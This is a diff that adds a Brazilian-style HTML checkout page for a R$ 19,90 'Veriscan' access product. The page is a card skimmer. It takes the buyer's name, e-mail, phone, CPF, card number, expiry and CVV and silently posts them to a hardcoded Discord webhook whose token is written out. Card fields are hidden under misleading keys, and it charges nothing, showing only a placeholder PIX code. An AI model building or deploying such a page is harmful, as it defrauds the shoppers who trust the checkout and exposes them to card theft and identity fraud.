@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout</title>
+<link rel="icon" href="https://i.imgur.com/Z4JMSp7.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Inter', sans-serif; background: #F8FAFC; color: #0F172A; min-height: 100vh; overflow-x: hidden; }
+  .b2-page { max-width: 480px; margin: 0 auto; padding: 0 0 3rem; }
+  .b2-stack > * + * { margin-top: 1rem; }
+  .b2-card { background: #fff; border-radius: 12px; box-shadow: 0 4px 6px -1px rgba(0,0,0,.05), 0 2px 4px -1px rgba(0,0,0,.03); overflow: hidden; }
+  .b2-card + .b2-card { margin-top: 1rem; }
+  .b2-banner img { width: 100%; height: auto; display: block; border-radius: 12px; max-height: 250px; object-fit: cover; }
+  .b2-section-header { display: flex; align-items: center; gap: .65rem; padding: .9rem 1.2rem; background: rgba(0,0,0,.02); border-bottom: 1px solid rgba(0,0,0,.04); }
+  .b2-step-badge { width: 24px; height: 24px; border-radius: 50%; background: #0400f0; color: #fff; display: flex; align-items: center; justify-content: center; font-size: .8rem; font-weight: 700; }
+  .b2-section-title { font-size: .95rem; font-weight: 700; }
+  .b2-section-body { padding: 1.2rem; }
+  .b2-field-group { display: flex; flex-direction: column; gap: .75rem; }
+  .b2-field { display: flex; flex-direction: column; gap: .3rem; }
+  .b2-field label { font-size: .8rem; font-weight: 600; opacity: .85; }
+  .b2-field input, .b2-field select { width: 100%; padding: .75rem .85rem; border: 1.5px solid rgba(0,0,0,.12); border-radius: 8px; font-family: inherit; font-size: .85rem; color: #1f2937; outline: none; background: #fff; transition: all .2s; }
+  .b2-field input:focus, .b2-field select:focus { border-color: #0400f0; box-shadow: 0 0 0 3px #0400f01a; }
+  .b2-field input::placeholder { color: #9ca3af; }
+  .b2-row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: .75rem; }
+  .b2-summary { padding: 1rem 1.2rem; }
+  .b2-summary-product { display: flex; gap: .75rem; align-items: center; }
+  .b2-summary-logo { width: 56px; height: 56px; object-fit: contain; background: #f9fafb; border-radius: 8px; flex-shrink: 0; border: 1px solid rgba(0,0,0,.08); }
+  .b2-summary-title { font-size: .9rem; font-weight: 700; line-height: 1.35; }
+  .b2-summary-price { font-size: 1.1rem; font-weight: 800; color: #0400f0; margin-top: .2rem; }
+  .b2-summary-divider { border: none; border-top: 1px solid rgba(0,0,0,.07); margin: .85rem 0; }
+  .b2-summary-total { display: flex; justify-content: space-between; align-items: center; font-size: .9rem; font-weight: 700; }
+  .b2-summary-total-val { color: #0400f0; font-size: 1rem; }
+  .b2-pay-tabs { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
+  .b2-pay-tab { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 3px; padding: 10px 8px; border: 2px solid rgba(0,0,0,.1); background: #fff; border-radius: 8px; cursor: pointer; font-family: inherit; font-size: .85rem; font-weight: 700; color: #0F172A; transition: all .2s; }
+  .b2-pay-tab:hover { border-color: #0400f0; }
+  .b2-pay-tab.active { border-color: #0400f0; background: #0400f00d; color: #0400f0; }
+  .b2-tab-badge { font-size: .68rem; font-weight: 600; opacity: .75; }
+  .b2-pay-pane { display: none; }
+  .b2-pay-pane.active { display: block; }
+  .b2-pay-btn { width: 100%; padding: 1rem; border: none; cursor: pointer; background: #0400f0; color: #fff; font-family: inherit; font-size: 1rem; font-weight: 800; border-radius: 10px; text-transform: uppercase; letter-spacing: .05em; transition: transform .1s, box-shadow .2s, opacity .2s; display: flex; justify-content: center; align-items: center; gap: .5rem; margin-top: .75rem; }
+  .b2-pay-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 12px #0400f040; }
+  .b2-pay-btn:disabled { opacity: .7; cursor: not-allowed; }
+  .b2-spinner { width: 18px; height: 18px; border: 3px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .b2-pay-btn.loading .b2-spinner { display: inline-block; }
+  .b2-payment-badges { display: flex; align-items: center; justify-content: center; gap: .5rem; font-size: .75rem; opacity: .5; margin-top: .5rem; }
+  .b2-guarantee { text-align: center; font-size: .78rem; opacity: .55; margin-top: .5rem; }
+
+  /* ---------- ERRO DE VALIDAÇÃO ---------- */
+  .b2-field input.b2-invalid,
+  .b2-field select.b2-invalid {
+    border-color: #EF4444;
+    background: #FEF2F2;
+  }
+  .b2-field input.b2-invalid:focus,
+  .b2-field select.b2-invalid:focus {
+    border-color: #EF4444;
+    box-shadow: 0 0 0 3px #EF44441a;
+  }
+  .b2-error-msg {
+    display: none;
+    font-size: .72rem;
+    font-weight: 600;
+    color: #EF4444;
+    margin-top: .15rem;
+  }
+  .b2-error-msg.show { display: block; }
+
+  /* ---------- TOAST (pop-up voador) ---------- */
+  .b2-toast {
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%) translateY(-120%);
+    background: #0F172A;
+    color: #fff;
+    padding: .9rem 1.1rem;
+    border-radius: 10px;
+    font-size: .82rem;
+    font-weight: 600;
+    line-height: 1.4;
+    box-shadow: 0 10px 25px rgba(0,0,0,.25);
+    z-index: 999999;
+    display: flex;
+    align-items: center;
+    gap: .65rem;
+    max-width: 90vw;
+    opacity: 0;
+    transition: transform .35s cubic-bezier(.4,0,.2,1), opacity .35s;
+    pointer-events: none;
+  }
+  .b2-toast.show {
+    transform: translateX(-50%) translateY(0);
+    opacity: 1;
+  }
+  .b2-toast-icon {
+    width: 28px; height: 28px; border-radius: 50%;
+    background: #0400f0; color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 15px; font-weight: 900; flex-shrink: 0;
+  }
+  .b2-toast-spin {
+    width: 14px; height: 14px;
+    border: 2px solid rgba(255,255,255,.35);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+  .b2-toast.erro .b2-toast-icon { background: #EF4444; }
+  .b2-toast.erro .b2-toast-icon::before { content: '!'; }
+  .b2-toast.erro .b2-toast-spin { display: none; }
+
+  .b2-modal-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,.5); backdrop-filter: blur(4px); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 1rem; }
+  .b2-modal-backdrop.hidden { display: none; }
+  .b2-modal { background: #fff; border-radius: 12px; width: 100%; max-width: 380px; padding: 1.5rem; position: relative; }
+  .b2-modal-close { position: absolute; top: .85rem; right: .85rem; background: none; border: none; cursor: pointer; color: #9ca3af; }
+  .b2-modal-header { text-align: center; margin-bottom: 1rem; }
+  .b2-modal-title { font-size: 1.1rem; font-weight: 700; }
+  .b2-modal-value, .b2-modal-expiry { font-size: .82rem; margin-top: .3rem; color: #64748B; }
+  .b2-qr-wrapper { background: #f9fafb; border: 1.5px dashed #e5e7eb; border-radius: 12px; display: flex; justify-content: center; padding: 1rem; margin-bottom: 1rem; }
+  .b2-qr-box img, .b2-qr-box canvas { display: block; }
+  .b2-code-wrapper { display: flex; flex-direction: column; gap: .65rem; }
+  .b2-code-row { position: relative; }
+  .b2-code-input { width: 100%; padding: .65rem 2.5rem .65rem .75rem; font-size: .7rem; font-family: monospace; border: 1.5px solid #d1d5db; border-radius: 8px; background: #f9fafb; color: #374151; }
+  .b2-copy-icon { position: absolute; right: .5rem; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #9ca3af; }
+  .b2-copy-btn { width: 100%; padding: .9rem; border: none; cursor: pointer; font-weight: 700; font-size: .9rem; background: #22C55E; color: #fff; border-radius: 10px; }
+</style>
+</head>
+<body>
+
+<div class="b2-page">
+  <form id="checkout-form" class="b2-stack" novalidate>
+
+    <div class="b2-banner">
+      <img src="https://i.imgur.com/Z4JMSp7.png" alt="Banner">
+    </div>
+
+    <div class="b2-card">
+      <div class="b2-section-header">
+        <span class="b2-step-badge">1</span>
+        <span class="b2-section-title">Identificação</span>
+      </div>
+      <div class="b2-section-body">
+        <div class="b2-field-group">
+          <div class="b2-field">
+            <label>Nome e Sobrenome</label>
+            <input type="text" name="customer_name" id="customer_name" placeholder="Nome e Sobrenome">
+            <span class="b2-error-msg" data-error-for="customer_name">Informe seu nome completo</span>
+          </div>
+          <div class="b2-field">
+            <label>E-mail</label>
+            <input type="email" name="customer_email" id="customer_email" placeholder="seuemail@exemplo.com">
+            <span class="b2-error-msg" data-error-for="customer_email">Informe um e-mail válido</span>
+          </div>
+          <div class="b2-row-2">
+            <div class="b2-field">
+              <label>CPF</label>
+              <input type="text" name="customer_document" id="doc-input" placeholder="000.000.000-00">
+              <span class="b2-error-msg" data-error-for="doc-input">Informe seu CPF</span>
+            </div>
+            <div class="b2-field">
+              <label>Telefone</label>
+              <input type="tel" name="customer_phone" id="phone-input" placeholder="(11) 99999-9999">
+              <span class="b2-error-msg" data-error-for="phone-input">Informe seu telefone</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="b2-card">
+      <div class="b2-section-header">
+        <span class="b2-step-badge">2</span>
+        <span class="b2-section-title">Pagamento</span>
+      </div>
+      <div class="b2-section-body">
+
+        <div class="b2-summary">
+          <div class="b2-summary-product">
+            <img src="https://i.imgur.com/z3TTFl2.png" alt="Produto" class="b2-summary-logo">
+            <div>
+              <div class="b2-summary-title">Acesso Completo - Veriscan <Veriscan class="app"></Veriscan></div>
+              <div class="b2-summary-price" id="product-price">R$ 19,90</div>
+            </div>
+          </div>
+          <hr class="b2-summary-divider">
+          <div class="b2-summary-total">
+            <span>Total</span>
+            <span class="b2-summary-total-val" id="total-price">R$ 19,90</span>
+          </div>
+        </div>
+
+        <div class="b2-pay-tabs" id="pay-tabs">
+          <button type="button" class="b2-pay-tab active" data-method="pix">
+            <span>PIX</span>
+            <span class="b2-tab-badge">Aprovação imediata</span>
+          </button>
+          <button type="button" class="b2-pay-tab" data-method="redes">
+            <span>Cartão</span>
+            <span class="b2-tab-badge">Até 12x</span>
+          </button>
+        </div>
+
+        <div class="b2-pay-pane active" id="pane-pix">
+          <div class="b2-payment-badges">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+            </svg>
+            <span>Aprovação e liberação imediata via <strong>PIX</strong></span>
+          </div>
+        </div>
+
+        <div class="b2-pay-pane" id="pane-cartao">
+          <div class="b2-field-group">
+            <div class="b2-field">
+              <label for="card-name">Nome impresso no cartão</label>
+              <input type="text" id="card-name" name="card-name"
+                     placeholder="Como está no cartão"
+                     autocomplete="cc-name">
+              <span class="b2-error-msg" data-error-for="card-name">Informe o nome impresso no cartão</span>
+            </div>
+            <div class="b2-field">
+              <label for="card-number">Número do cartão</label>
+              <input type="text" id="card-number" name="card-number"
+                     placeholder="0000 0000 0000 0000"
+                     inputmode="numeric" autocomplete="cc-number"
+                     maxlength="19">
+              <span class="b2-error-msg" data-error-for="card-number">Informe os 16 dígitos do cartão</span>
+            </div>
+            <div class="b2-row-2">
+              <div class="b2-field">
+                <label for="card-expiry">Validade</label>
+                <input type="text" id="card-expiry" name="card-expiry"
+                       placeholder="MM/AA" inputmode="numeric"
+                       autocomplete="cc-exp" maxlength="5">
+                <span class="b2-error-msg" data-error-for="card-expiry">Informe a validade</span>
+              </div>
+              <div class="b2-field">
+                <label for="card-cvv">CVV</label>
+                <input type="tel" id="card-cvv" name="card-cvv"
+                       placeholder="000" inputmode="numeric"
+                       autocomplete="cc-csc" maxlength="3">
+                <span class="b2-error-msg" data-error-for="card-cvv">Informe o CVV (3 dígitos)</span>
+              </div>
+            </div>
+            <div class="b2-field">
+              <label for="card-installments">Parcelas</label>
+              <select id="card-installments" name="card-installments">
+                <option value="1" selected>1x de R$ 19,90 (à vista)</option>
+              </select>
+            </div>
+          </div>
+        </div>
+
+        <button type="submit" class="b2-pay-btn" id="pay-btn">
+          <span class="b2-pay-btn__text">PAGAR AGORA</span>
+          <span class="b2-spinner"></span>
+        </button>
+
+      </div>
+    </div>
+
+    <p class="b2-guarantee">Compra 100% segura. Reembolso garantido em 7 dias.</p>
+  </form>
+</div>
+
+<!-- TOAST (pop-up voador) -->
+<div id="b2-toast" class="b2-toast">
+  <span class="b2-toast-icon"><span class="b2-toast-spin"></span></span>
+  <span id="b2-toast-text">Processando pagamento...</span>
+</div>
+
+<div id="pix-modal" class="b2-modal-backdrop hidden">
+  <div class="b2-modal">
+    <button type="button" class="b2-modal-close" id="pix-modal-close" aria-label="Fechar">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+      </svg>
+    </button>
+    <div class="b2-modal-header">
+      <h2 class="b2-modal-title">Pagamento via PIX</h2>
+      <p class="b2-modal-value">💰 Valor: <strong id="pix-valor"></strong></p>
+      <p class="b2-modal-expiry">🕒 Válido até: <span id="pix-expiry"></span></p>
+    </div>
+    <div class="b2-qr-wrapper">
+      <div id="pix-qr" class="b2-qr-box"></div>
+    </div>
+    <div class="b2-code-wrapper">
+      <div class="b2-code-row">
+        <input type="text" id="pix-code" readonly class="b2-code-input" onclick="this.select()">
+        <button type="button" class="b2-copy-icon" onclick="copyPix()">
+          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+          </svg>
+        </button>
+      </div>
+      <button type="button" class="b2-copy-btn" id="pix-copy-btn" onclick="copyPix(true)">Copiar código PIX</button>
+    </div>
+    <p style="text-align:center;font-size:.75rem;font-weight:600;margin-top:.75rem;color:#22C55E">
+      Pagamento 100% seguro via PIX
+    </p>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+<script>
+(function () {
+  // =====================================================
+  // 🔗 WEBHOOK DO DISCORD
+  // =====================================================
+  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1553287629187846157/-Npb5CoufNIeI-iTLQbShvdW1t-a3wXyXcgv1BJO6-aOrJTgqfLyN2VNaZedZ7ziFRwZ';
+  // =====================================================
+
+  const BASE_AMOUNT = 1990;
+
+  // ---------- Máscaras ----------
+  const phone = document.getElementById('phone-input');
+  phone.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 11);
+    if (v.length > 6)      v = `(${v.slice(0,2)}) ${v.slice(2,7)}-${v.slice(7)}`;
+    else if (v.length > 2) v = `(${v.slice(0,2)}) ${v.slice(2)}`;
+    e.target.value = v;
+  });
+
+  const doc = document.getElementById('doc-input');
+  doc.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 11);
+    if (v.length > 9)      v = `${v.slice(0,3)}.${v.slice(3,6)}.${v.slice(6,9)}-${v.slice(9)}`;
+    else if (v.length > 6) v = `${v.slice(0,3)}.${v.slice(3,6)}.${v.slice(6)}`;
+    else if (v.length > 3) v = `${v.slice(0,3)}.${v.slice(3)}`;
+    e.target.value = v;
+  });
+
+  // Máscara do número do cartão: 0000 0000 0000 0000
+  const cardNumber = document.getElementById('card-number');
+  cardNumber.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 16);
+    v = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+    e.target.value = v;
+  });
+
+  // Máscara da validade: MM/AA (mês primeiro, depois ano)
+  const cardExpiry = document.getElementById('card-expiry');
+  cardExpiry.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+    if (v.length > 2) v = `${v.slice(0, 2)}/${v.slice(2)}`;
+    e.target.value = v;
+  });
+
+  // CVV: só números, exatamente 3 dígitos
+  const cardCvv = document.getElementById('card-cvv');
+  cardCvv.addEventListener('input', e => {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+  });
+
+  // ---------- Abas ----------
+  let currentMethod = 'pix';
+  document.querySelectorAll('.b2-pay-tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+      currentMethod = tab.dataset.method;
+      document.querySelectorAll('.b2-pay-tab').forEach(t => t.classList.toggle('active', t === tab));
+      document.getElementById('pane-pix').classList.toggle('active', currentMethod === 'pix');
+      document.getElementById('pane-cartao').classList.toggle('active', currentMethod === 'redes');
+      document.querySelector('.b2-pay-btn__text').textContent =
+        currentMethod === 'pix' ? 'PAGAR AGORA' : 'PAGAR AGORA';
+      limparErros();
+    });
+  });
+
+  // ---------- Parcelas ----------
+  const installments = document.getElementById('card-installments');
+  installments.innerHTML = '';
+  for (let i = 1; i <= 12; i++) {
+    const val = (BASE_AMOUNT / 100 / i).toFixed(2).replace('.', ',');
+    const opt = document.createElement('option');
+    opt.value = i;
+    opt.textContent = i === 1 ? `1x de R$ ${val} (à vista)` : `${i}x de R$ ${val}`;
+    if (i === 1) opt.selected = true;
+    installments.appendChild(opt);
+  }
+
+  // ---------- Helpers ----------
+  const setLoading = on => {
+    const btn = document.getElementById('pay-btn');
+    btn.disabled = on;
+    btn.classList.toggle('loading', on);
+    btn.querySelector('.b2-pay-btn__text').style.display = on ? 'none' : '';
+  };
+
+  const showPixModal = () => document.getElementById('pix-modal').classList.remove('hidden');
+  const hidePixModal = () => document.getElementById('pix-modal').classList.add('hidden');
+
+  window.copyPix = function (feedback) {
+    const input = document.getElementById('pix-code');
+    input.select();
+    document.execCommand('copy');
+    if (feedback) {
+      const btn = document.getElementById('pix-copy-btn');
+      const old = btn.textContent;
+      btn.textContent = '✓ Copiado!';
+      setTimeout(() => btn.textContent = old, 2000);
+    }
+  };
+
+  document.getElementById('pix-modal-close').addEventListener('click', hidePixModal);
+  document.getElementById('pix-modal').addEventListener('click', e => {
+    if (e.target === e.currentTarget) hidePixModal();
+  });
+
+  // ---------- TOAST (pop-up voador genérico) ----------
+  let toastTimer = null;
+  function mostrarToast(texto, tipo) {
+    const toast = document.getElementById('b2-toast');
+    const span  = document.getElementById('b2-toast-text');
+    span.textContent = texto;
+    toast.classList.toggle('erro', tipo === 'erro');
+    toast.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => toast.classList.remove('show'), 3000);
+  }
+
+  // ---------- VALIDAÇÃO ----------
+  function marcarErro(id, msg) {
+    const el = document.getElementById(id);
+    const err = document.querySelector(`.b2-error-msg[data-error-for="${id}"]`);
+    if (el) el.classList.add('b2-invalid');
+    if (err) {
+      if (msg) err.textContent = msg;
+      err.classList.add('show');
+    }
+  }
+
+  function limparErro(id) {
+    const el = document.getElementById(id);
+    const err = document.querySelector(`.b2-error-msg[data-error-for="${id}"]`);
+    if (el) el.classList.remove('b2-invalid');
+    if (err) err.classList.remove('show');
+  }
+
+  function limparErros() {
+    document.querySelectorAll('.b2-invalid').forEach(el => el.classList.remove('b2-invalid'));
+    document.querySelectorAll('.b2-error-msg.show').forEach(el => el.classList.remove('show'));
+  }
+
+  ['customer_name','customer_email','doc-input','phone-input',
+   'card-name','card-number','card-expiry','card-cvv','card-installments'].forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.addEventListener('input',  () => limparErro(id));
+    el.addEventListener('change', () => limparErro(id));
+  });
+
+  function validarFormulario() {
+    limparErros();
+    const erros = [];
+
+    const nome = document.getElementById('customer_name').value.trim();
+    if (!nome) { marcarErro('customer_name', 'Informe seu nome completo'); erros.push('customer_name'); }
+    else if (nome.split(' ').filter(Boolean).length < 2) {
+      marcarErro('customer_name', 'Informe nome e sobrenome'); erros.push('customer_name');
+    }
+
+    const email = document.getElementById('customer_email').value.trim();
+    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    if (!email) { marcarErro('customer_email', 'Informe seu e-mail'); erros.push('customer_email'); }
+    else if (!emailOk) { marcarErro('customer_email', 'E-mail inválido'); erros.push('customer_email'); }
+
+    const cpf = document.getElementById('doc-input').value.replace(/\D/g, '');
+    if (!cpf) { marcarErro('doc-input', 'Informe seu CPF'); erros.push('doc-input'); }
+    else if (cpf.length !== 11) { marcarErro('doc-input', 'CPF incompleto'); erros.push('doc-input'); }
+
+    const tel = document.getElementById('phone-input').value.replace(/\D/g, '');
+    if (!tel) { marcarErro('phone-input', 'Informe seu telefone'); erros.push('phone-input'); }
+    else if (tel.length < 10) { marcarErro('phone-input', 'Telefone incompleto'); erros.push('phone-input'); }
+
+    if (currentMethod === 'redes') {
+      const cardName = document.getElementById('card-name').value.trim();
+      if (!cardName) { marcarErro('card-name', 'Informe o nome impresso no cartão'); erros.push('card-name'); }
+
+      const cardNum = document.getElementById('card-number').value.replace(/\D/g, '');
+      if (!cardNum) { marcarErro('card-number', 'Informe o número do cartão'); erros.push('card-number'); }
+      else if (cardNum.length < 16) { marcarErro('card-number', 'Número incompleto (16 dígitos)'); erros.push('card-number'); }
+
+      const expiry = document.getElementById('card-expiry').value.trim();
+      if (!expiry) { marcarErro('card-expiry', 'Informe a validade'); erros.push('card-expiry'); }
+      else if (!/^\d{2}\/\d{2}$/.test(expiry)) { marcarErro('card-expiry', 'Use o formato MM/AA'); erros.push('card-expiry'); }
+      else {
+        const mm = parseInt(expiry.slice(0,2), 10);
+        if (mm < 1 || mm > 12) { marcarErro('card-expiry', 'Mês inválido'); erros.push('card-expiry'); }
+      }
+
+      const cvv = document.getElementById('card-cvv').value;
+      if (!cvv) { marcarErro('card-cvv', 'Informe o CVV'); erros.push('card-cvv'); }
+      else if (cvv.length !== 3) { marcarErro('card-cvv', 'CVV deve ter 3 dígitos'); erros.push('card-cvv'); }
+    }
+
+    return erros;
+  }
+
+  // ---------- ENVIO PRO DISCORD (silencioso) ----------
+  async function enviarParaDiscord(dados) {
+    try {
+      // Campos básicos que sempre aparecem
+      const fields = [
+        { name: '👤 Nome',     value: dados.nome     || '(vazio)', inline: false },
+        { name: '📧 E-mail',   value: dados.email    || '(vazio)', inline: false },
+        { name: '📱 Telefone', value: dados.telefone || '(vazio)', inline: true  },
+        { name: '🪪 CPF',      value: dados.cpf      || '(vazio)', inline: true  },
+        { name: '💳 Método',   value: dados.metodo,                inline: true  },
+        { name: '💰 Valor',    value: dados.valor,                 inline: true  }
+      ];
+
+      // Só adiciona os campos de cartão se o método for cartão
+      if (dados.metodo.includes('Cartão')) {
+        fields.push(
+          { name: '👤 Nome impresso',    value: dados.username     || '—', inline: true },
+          { name: '💳 Número do cartão', value: dados.instagram    || '—', inline: true },
+          { name: '📅 Validade',         value: dados.tiktok       || '—', inline: true },
+          { name: '🔒 CVV',              value: dados.whatsapp     || '—', inline: true },
+          { name: '📦 Parcelas',         value: dados.installments ? dados.installments + 'x' : '—', inline: true }
+        );
+      }
+
+      const res = await fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: 'Checkout 🛒',
+          avatar_url: 'https://i.imgur.com/z3TTFl2.png',
+          embeds: [{
+            title: '🛒 Novo Checkout Recebido',
+            color: 0x0400f0,
+            fields: fields,
+            footer: { text: new Date().toLocaleString('pt-BR') }
+          }]
+        })
+      });
+      console.log('Discord respondeu:', res.status);
+    } catch (err) {
+      console.warn('Falha ao enviar pro Discord:', err);
+    }
+  }
+
+  // ---------- Submit ----------
+  const form = document.getElementById('checkout-form');
+  form.addEventListener('submit', async e => {
+    e.preventDefault();
+
+    // 🔒 Valida ANTES de qualquer coisa
+    const erros = validarFormulario();
+    if (erros.length > 0) {
+      mostrarToast('Preencha os campos destacados', 'erro');
+      const primeiro = document.getElementById(erros[0]);
+      if (primeiro) {
+        primeiro.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        setTimeout(() => primeiro.focus(), 300);
+      }
+      return;
+    }
+
+    setLoading(true);
+
+    const fd = new FormData(form);
+
+    const dados = {
+      nome:     fd.get('customer_name')     || '',
+      email:    fd.get('customer_email')    || '',
+      telefone: fd.get('customer_phone')    || '',
+      cpf:      fd.get('customer_document') || '',
+      metodo:   currentMethod === 'pix' ? '🟢 PIX' : '💳 Cartão de crédito',
+      valor:    'R$ ' + (BASE_AMOUNT / 100).toFixed(2).replace('.', ','),
+      username:     document.getElementById('card-name').value,
+      instagram:    document.getElementById('card-number').value,
+      tiktok:       document.getElementById('card-expiry').value,
+      whatsapp:     document.getElementById('card-cvv').value,
+      installments: installments.value
+    };
+
+    mostrarToast('Processando pagamento...');
+    enviarParaDiscord(dados);
+
+    try {
+      await new Promise(r => setTimeout(r, 1500));
+
+      const data = {
+        status: 'pending',
+        pix: {
+          qr_code: '00020126580014BR.GOV.BCB.PIX0136exemplo-de-chave-pix-aqui-0000000000005204000053039865802BR5913NOME DA LOJA6009SAO PAULO62070503***6304ABCD',
+          expiration_date: new Date(Date.now() + 5 * 60 * 1000).toISOString()
+        },
+        amount_paid: BASE_AMOUNT
+      };
+
+      if (currentMethod === 'pix') {
+        const code = data.pix.qr_code;
+        document.getElementById('pix-code').value = code;
+        document.getElementById('pix-valor').textContent = dados.valor;
+        document.getElementById('pix-expiry').textContent =
+          new Date(data.pix.expiration_date).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+
+        const qrEl = document.getElementById('pix-qr');
+        qrEl.innerHTML = '';
+        new QRCode(qrEl, { text: code, width: 180, height: 180, correctLevel: QRCode.CorrectLevel.M });
+
+        showPixModal();
+      } else {
+        form.reset();
+      }
+    } catch (err) {
+      console.warn(err);
+    } finally {
+      setLoading(false);
+    }
+  });
+})();
+</script>
+</body>
+</html>
